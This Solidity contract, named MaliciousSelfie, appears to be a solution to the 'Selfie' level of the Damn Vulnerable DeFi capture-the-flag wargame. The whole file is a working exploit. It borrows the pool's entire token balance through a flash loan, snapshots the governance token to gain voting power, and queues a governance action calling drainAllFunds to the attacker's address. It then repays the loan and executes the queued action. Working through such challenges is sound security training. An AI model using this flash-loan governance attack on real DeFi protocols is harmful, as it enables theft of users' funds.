// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract MaliciousSelfie {
    SelfiePool loans;
    SimpleGovernance gov;
    address owner;
    uint256 actionId;

    constructor (address payable l, address payable g) {
        loans = SelfiePool(l);
        gov = SimpleGovernance(g);
        owner = msg.sender;
    }

    function attack() external {
        loans.flashLoan(loans.token().balanceOf(address(loans)));
    }

    function receiveTokens(address token, uint256 amount) external {
        DamnValuableTokenSnapshot(address(loans.token())).snapshot();
        actionId = gov.queueAction(address(loans), abi.encodeWithSignature("drainAllFunds(address)",owner), 0);
        loans.token().transfer(address(loans), amount);
    }

    function execute() external {
        gov.executeAction(actionId);
    }
}